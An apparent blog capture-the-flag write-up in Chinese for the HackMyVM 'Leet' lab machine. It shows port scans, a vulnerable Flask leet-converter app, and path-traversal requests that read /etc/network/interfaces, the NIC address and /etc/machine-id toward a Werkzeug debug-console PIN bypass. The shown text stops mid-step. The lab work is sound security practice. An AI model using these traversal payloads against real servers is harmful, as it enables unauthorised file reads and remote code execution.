<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Leet.

 https://hackmyvm.eu/machines/machine.php?vm=Leet
 

Notes：Enjoy it.

前期踩点







Web 渗透

信息收集

`7777` 是 web 端口



看样子是一个 `Leet` 转换器：Leet，又称黑客语，是指一种发源于西方国家的BBS、在线游戏和黑客社群所使用的文字书写方式。通常是把拉丁字母转变成数字..." data-next-head=""/><meta property="og:title" content="HackMyVM - Leet" data-next-head=""/><meta property="og:description" content="Leet.

 https://hackmyvm.eu/machines/machine.php?vm=Leet
 

Notes：Enjoy it.

前期踩点







Web 渗透

信息收集

`7777` 是 web 端口



看样子是一个 `Leet` 转换器：Leet，又称黑客语，是指一种发源于西方国家的BBS、在线游戏和黑客社群所使用的文字书写方式。通常是把拉丁字母转变成数字..." data-next-head=""/><meta property="og:url" content="https://sunsetaction.top/2025/04/21/HackMyVMLeet" data-next-head=""/><meta property="og:type" content="article" data-next-head=""/><meta property="article:published_time" content="2025-04-21" data-next-head=""/><meta property="article:modified_time" content="2025-04-21" data-next-head=""/><meta property="article:section" content="靶机" data-next-head=""/><meta property="article:tag" content="Linux靶机" data-next-head=""/><meta property="article:tag" content="HackMyVM" data-next-head=""/><meta property="article:tag" content="Nginx" data-next-head=""/><meta property="article:tag" content="Micro" data-next-head=""/><meta property="article:tag" content="Werkzeug" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="HackMyVM - Leet" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top/2025/04/21/HackMyVMLeet" data-next-head=""/><title data-next-head="">HackMyVM - Leet</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="https://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="https://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/1313794ff57095ab.css" as="style"/><link rel="stylesheet" href="/_next/static/css/1313794ff57095ab.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-0d12d6e4400a07d7.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-603a6856ad27351b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/951-ad0cb56524ddaaf1.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-19a80ecec622553d.js" defer=""></script><script src="/_next/static/Cn2u-1XBPoyjEdHEI3G0H/_buildManifest.js" defer=""></script><script src="/_next/static/Cn2u-1XBPoyjEdHEI3G0H/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3/4 lg:w-2/3 xl:w-4xl px-3 mt-5 md:mt-15 max-w-[800px]"><h1 class="text-xl md:text-2xl font-bold text-red-700 dark:text-red-400">HackMyVM - Leet</h1><div class="flex flex-col"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">SUNSET</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">2025-04-21</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">(Updated:<!-- -->2025-04-21<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Tags:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Linux靶机</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">HackMyVM</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Nginx</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Micro</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Werkzeug</span></div></div><div class="my-8 text-center">加载中...</div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackMyVMLeet","contentHtml":"\u003ch1\u003eLeet.\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://hackmyvm.eu/machines/machine.php?vm=Leet\"\u003ehttps://hackmyvm.eu/machines/machine.php?vm=Leet\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eNotes：\u003cstrong\u003eEnjoy it.\u003c/strong\u003e\u003c/p\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜Leet nmap -sP 192.168.56.0/24\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-20 23:56 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.1\nHost is up (0.00019s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.2\nHost is up (0.000088s latency).\nMAC Address: 08:00:27:02:0A:DA (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.46\nHost is up (0.00023s latency).\nMAC Address: 08:00:27:43:50:51 (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.47\nHost is up (0.00034s latency).\nMAC Address: 08:00:27:B0:63:BE (Oracle VirtualBox virtual NIC)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Leet nmap -sT -min-rate 10000 -p- 192.168.56.47\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-20 23:57 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.47\nHost is up (0.00049s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n7777/tcp open  cbt\nMAC Address: 08:00:27:B0:63:BE (Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 8.09 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Leet nmap -sT -A -T4 -O -p 22,7777 192.168.56.47\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-20 23:57 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.47\nHost is up (0.00024s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)\n| ssh-hostkey: \n|   256 e1:5d:7c:b7:07:92:17:dc:46:76:7d:be:a9:50:43:d2 (ECDSA)\n|_  256 a0:f3:b3:86:93:f5:58:82:88:\u003cspan class=\"hljs-built_in\"\u003edd\u003c/span\u003e:e5:10:db:35:de:62 (ED25519)\n7777/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.11.2)\n|_http-title: Site doesn\u003cspan class=\"hljs-string\"\u003e't have a title (text/html; charset=utf-8).\n|_http-server-header: Werkzeug/3.0.1 Python/3.11.2\nMAC Address: 08:00:27:B0:63:BE (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.24 ms 192.168.56.47\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 24.98 seconds\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eWeb 渗透\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003e7777\u003c/code\u003e 是 web 端口\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMLeet/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e看样子是一个 \u003cstrong\u003e\u003ccode\u003eLeet\u003c/code\u003e\u003c/strong\u003e 转换器：Leet，又称黑客语，是指一种发源于西方国家的BBS、在线游戏和黑客社群所使用的文字书写方式。通常是把拉丁字母转变成数字或是特殊符号，例如E写成3、A写成@等。\u003c/p\u003e\n\u003cp\u003e并且提供了下载链接\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMLeet/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e任意文件读取\u003c/h3\u003e\n\u003cp\u003e感觉会存在任意文件读取\u003c/p\u003e\n\u003cp\u003e在报错页面能知道是 \u003ccode\u003eflask\u003c/code\u003e 搭建的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMLeet/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e构造恶意连接，成功读取。存在\u003ccode\u003eriva\u003c/code\u003e用户。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMLeet/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e根据错误页面能知道程序位于 \u003ccode\u003e/opt/project/app.py\u003c/code\u003e ，构造恶意链接进行读取，但是没什么利用点\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efrom flask import Flask, request, send_file, abort, render_template_string\nfrom werkzeug.exceptions import BadRequest\nimport os\n\napp = Flask(__name__)\napp.config[\u003cspan class=\"hljs-string\"\u003e'DEBUG'\u003c/span\u003e] = True \n\n@app.route(\u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e, methods=[\u003cspan class=\"hljs-string\"\u003e'GET'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'POST'\u003c/span\u003e])\ndef leet_converter():\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e request.method == \u003cspan class=\"hljs-string\"\u003e'POST'\u003c/span\u003e:\n        text = request.form[\u003cspan class=\"hljs-string\"\u003e'text'\u003c/span\u003e]\n        leet_text = text.translate(str.maketrans(\u003cspan class=\"hljs-string\"\u003e\"aeios\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"43105\"\u003c/span\u003e))\n        output_filename = \u003cspan class=\"hljs-string\"\u003e\"/tmp/converted_text.txt\"\u003c/span\u003e\n        with open(output_filename, \u003cspan class=\"hljs-string\"\u003e\"w\"\u003c/span\u003e) as f:\n            f.write(leet_text)\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e render_template_string(\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e'\n            \u0026#x3C;!DOCTYPE html\u003e\n            \u0026#x3C;html\u003e\n            \u0026#x3C;head\u003e\n\t\t\u0026#x3C;title\u003eL33T Convertor\u0026#x3C;/title\u003e\n                \u0026#x3C;style\u003e\n                    body { background-color: #333; color: #ddd; font-family: \"Courier New\", Courier, monospace; margin: 0; padding: 20px; }\n                    .container { max-width: 600px; margin: auto; padding: 20px; background-color: #444; border-radius: 8px; }\n                    h2 {\n\t\t    color: #eee;\n    \t\t    text-align: center;\n\t\t    }\n\n                    a, a:visited { color: #dcdcdc; text-decoration: underline; }\n                    a:hover { color: #ffffff; }\n                    form { display: flex; flex-direction: column; }\n                    input[type=\"text\"], input[type=\"submit\"] { padding: 10px; margin-top: 10px; border-radius: 4px; border: 1px solid #555; background: #555; color: #ddd; }\n                    input[type=\"submit\"] { cursor: pointer; }\n                    input[type=\"submit\"]:hover { background: #666; }\n                \u0026#x3C;/style\u003e\n            \u0026#x3C;/head\u003e\n            \u0026#x3C;body\u003e\n                \u0026#x3C;div class=\"container\"\u003e\n                    \u0026#x3C;h2\u003eL33T converter\u0026#x3C;/h2\u003e\n                    \u0026#x3C;form method=\"post\"\u003e\n                        \u0026#x3C;input type=\"text\" name=\"text\" placeholder=\"Type your text here\"\u003e\n                        \u0026#x3C;input type=\"submit\" value=\"Convert to L33T\"\u003e\n                    \u0026#x3C;/form\u003e\n                    {% if leet_text %}\n                        \u0026#x3C;p\u003eRésultat : {{ leet_text }}\u0026#x3C;/p\u003e\n                        \u0026#x3C;a href=\"/download?filename=converted_text.txt\"\u003eDownload file text\u0026#x3C;/a\u003e\n                    {% endif %}\n                \u0026#x3C;/div\u003e\n            \u0026#x3C;/body\u003e\n            \u0026#x3C;/html\u003e\n        '\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e, leet_text=leet_text)\n    \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e render_template_string(\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e'\n            \u0026#x3C;!DOCTYPE html\u003e\n            \u0026#x3C;html\u003e\n            \u0026#x3C;head\u003e\n                \u0026#x3C;style\u003e\n                    body { background-color: #333; color: #ddd; font-family: \"Courier New\", Courier, monospace; margin: 0; padding: 20px; }\n                    .container { max-width: 600px; margin: auto; padding: 20px; background-color: #444; border-radius: 8px; }\n                    h2 { color: #eee; }\n                    form { display: flex; flex-direction: column; }\n                    input[type=\"text\"], input[type=\"submit\"] { padding: 10px; margin-top: 10px; border-radius: 4px; border: 1px solid #555; background: #555; color: #ddd; }\n                    input[type=\"submit\"] { cursor: pointer; }\n                    input[type=\"submit\"]:hover { background: #666; }\n                \u0026#x3C;/style\u003e\n            \u0026#x3C;/head\u003e\n            \u0026#x3C;body\u003e\n                \u0026#x3C;div class=\"container\"\u003e\n                    \u0026#x3C;center\u003e\u0026#x3C;h2\u003eL33T Converter\u0026#x3C;/h2\u003e\u0026#x3C;/center\u003e\n                    \u0026#x3C;form method=\"post\"\u003e\n                        \u0026#x3C;input type=\"text\" name=\"text\" placeholder=\"Type your text here\"\u003e\n                        \u0026#x3C;input type=\"submit\" value=\"Convert to L33T\"\u003e\n                    \u0026#x3C;/form\u003e\n                \u0026#x3C;/div\u003e\n            \u0026#x3C;/body\u003e\n            \u0026#x3C;/html\u003e\n        '\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e)\n\n@app.route(\u003cspan class=\"hljs-string\"\u003e'/download'\u003c/span\u003e)\ndef download_file():\n    filename = request.args.get(\u003cspan class=\"hljs-string\"\u003e'filename'\u003c/span\u003e)\n\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e not filename or filename.startswith(\u003cspan class=\"hljs-string\"\u003e\"/\"\u003c/span\u003e):\n        raise ValueError(\u003cspan class=\"hljs-string\"\u003e\"Parameter 'filename' invalid or missing.\"\u003c/span\u003e)\n\n    filepath = os.path.join(\u003cspan class=\"hljs-string\"\u003e\"/tmp\"\u003c/span\u003e, filename)\n\n    try:\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e send_file(filepath, as_attachment=True)\n    except Exception as e:\n        raise e\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e __name__ == \u003cspan class=\"hljs-string\"\u003e'__main__'\u003c/span\u003e:\n    app.run(debug=True, host=\u003cspan class=\"hljs-string\"\u003e'0.0.0.0'\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e扫描一下目录，寻找敏感文件，打算利用任意文件读取\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Leet dirsearch -u http://192.168.56.47:7777 -x 403,404,429 -e php,zip,txt\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/Desktop/test/Leet/reports/http_192.168.56.47_7777/_25-04-21_00-26-36.txt\n\nTarget: http://192.168.56.47:7777/\n\n[00:26:36] Starting: \n[00:26:51] 200 -    2KB - /console\n[00:26:53] 500 -   14KB - /download\n\nTask Completed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问 \u003ccode\u003e/console\u003c/code\u003e ，是\u003cstrong\u003eWerkzeug\u003c/strong\u003e，能执行命令，但是被锁住了，要求输入\u003ccode\u003ePIN\u003c/code\u003e码。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMLeet/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003ePIN bypass \u0026#x26; 利用\u003c/h3\u003e\n\u003cp\u003e在网上寻找 \u003cstrong\u003eWerkzeug\u003c/strong\u003e 相关漏洞，能找到：\u003ca href=\"https://github.com/wdahlenburg/werkzeug-debug-console-bypass\"\u003ehttps://github.com/wdahlenburg/werkzeug-debug-console-bypass\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWerkzeug Debug Console Pin Bypass\u003c/strong\u003e 也就是绕过控制 PIN\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWerkzeug has a debug console that requires a pin by default. It's possible to bypass this with an LFI vulnerability or use it as a local privilege escalation vector. The debug console will lock after 10 invalid attempts which requires the server to be restarted for another 10 guesses.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWerkzeug 有一个默认需要 pin 的调试控制台。可以使用 LFI 漏洞绕过此问题，或将其用作本地权限提升向量。调试控制台将在 10 次无效尝试后锁定，这需要重新启动服务器以再进行 10 次猜测。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003e根据文档，我们要得到：\u003ccode\u003eusername\u003c/code\u003e ，\u003ccode\u003eFlask\u003c/code\u003e ，获取服务器托管的接口的 \u003ccode\u003eMac\u003c/code\u003e 地址，Machine_id\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eusername\u003c/code\u003e：\u003ccode\u003ewww-data\u003c/code\u003e或者\u003ccode\u003eriva\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eFlask\u003c/code\u003e 的正确路径：在错误中能看到：\u003ccode\u003e/opt/project/venv/lib/python3.11/site-packages/flask/app.py\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e获取服务器托管的接口的 \u003ccode\u003eMac\u003c/code\u003e 地址：也就是网卡的物理地址\u003c/p\u003e\n\u003cp\u003e现在需要获取网卡的\u003ccode\u003eMAC\u003c/code\u003e地址，因为靶机系统是\u003ccode\u003eDebian\u003c/code\u003e ，所以配置文件在\u003ccode\u003e/etc/network/interfaces\u003c/code\u003e ，利用任意文件读取来读取\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/download?filename=../etc/network/interfaces\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e# This file describes the network interfaces available on your system\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# and how to activate them. For more information, see interfaces(5).\u003c/span\u003e\n\n\u003cspan class=\"hljs-built_in\"\u003esource\u003c/span\u003e /etc/network/interfaces.d/*\n\n\u003cspan class=\"hljs-comment\"\u003e# The loopback network interface\u003c/span\u003e\nauto lo\niface lo inet loopback\n\n\u003cspan class=\"hljs-comment\"\u003e# The primary network interface\u003c/span\u003e\nallow-hotplug enp0s3\niface enp0s3 inet dhcp\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再读取网卡 \u003ccode\u003eenp0s3\u003c/code\u003e 的 MAC\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/download?filename=../sys/class/net/enp0s3/address\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e08:00:27:b0:63:be\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将 \u003ccode\u003eMAC\u003c/code\u003e 地址从十六进制转换为十进制\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePython 3.12.7 (main, Nov  8 2024, 17:55:36) [GCC 14.2.0] on linux\nType \u003cspan class=\"hljs-string\"\u003e\"help\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"copyright\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"credits\"\u003c/span\u003e or \u003cspan class=\"hljs-string\"\u003e\"license\"\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e more information.\n\u003e\u003e\u003e \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e.\u003cspan class=\"hljs-built_in\"\u003ejoin\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"08:00:27:b0:63:be\"\u003c/span\u003e.\u003cspan class=\"hljs-built_in\"\u003esplit\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\":\"\u003c/span\u003e))\n\u003cspan class=\"hljs-string\"\u003e'080027b063be'\u003c/span\u003e\n\u003e\u003e\u003e \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(0x080027b063be)\n8796758893502\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eMachine_id\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/download?filename=../etc/machine-id\nf6791f240ce6407ea271e86b78ac3bdb\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs 